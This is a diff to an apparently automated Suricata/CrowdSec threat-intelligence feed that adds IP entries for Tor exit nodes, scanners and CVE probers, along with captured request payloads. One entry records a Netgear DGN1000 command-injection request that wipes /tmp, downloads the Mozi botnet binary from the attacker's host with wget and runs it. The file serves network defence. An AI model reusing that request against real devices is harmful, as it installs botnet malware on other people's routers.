@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-06-15T17:00:00Z",
+  "generated_at": "2026-06-16T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 5,
-    "v4": 5,
+    "total": 23,
+    "v4": 23,
     "v6": 0
   },
   "items": [
@@ -109,6 +109,285 @@
       ],
       "payloads": [
         "GET /d/msdownload/update/software/defu/2026/06/am_delta_patch_1.453.90.0_6b5454b2724a858740a4e2bd1b5e567e0285f387.exe?cacheHostOrigin=3.au.download.windowsupdate.com"
+      ]
+    },
+    {
+      "ip": "40.124.175.5",
+      "family": "v4",
+      "first_seen": "2026-06-16T00:00:00Z",
+      "last_seen": "2026-06-16T00:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing",
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /druid/index.html"
+      ]
+    },
+    {
+      "ip": "83.220.64.48",
+      "family": "v4",
+      "first_seen": "2026-06-15T19:00:00Z",
+      "last_seen": "2026-06-15T19:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://83.220.64.48:41308/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://83.220.64.48:41308/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "20.65.185.115",
+      "family": "v4",
+      "first_seen": "2026-06-16T00:00:00Z",
+      "last_seen": "2026-06-16T00:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /ReportServer"
+      ]
+    },
+    {
+      "ip": "192.42.116.118",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 55"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "192.42.116.116",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 54"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "192.42.116.19",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 56"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "45.84.107.128",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 105"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.101.7",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 46"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.100.244",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 32"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "109.70.100.2",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 10"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "192.76.153.253",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 60"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.101.4",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 44"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "45.84.107.101",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 104"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "94.142.241.194",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 125"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.101.1",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 33"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "46.232.251.191",
+      "family": "v4",
+      "first_seen": "2026-06-15T21:00:00Z",
+      "last_seen": "2026-06-15T21:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 108"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "199.232.210.172",
+      "family": "v4",
+      "first_seen": "2026-06-15T19:00:00Z",
+      "last_seen": "2026-06-15T19:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cdn=\"fastly\""
+      ]
+    },
+    {
+      "ip": "117.15.92.51",
+      "family": "v4",
+      "first_seen": "2026-06-15T19:00:00Z",
+      "last_seen": "2026-06-15T19:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
       ]
     }
   ]
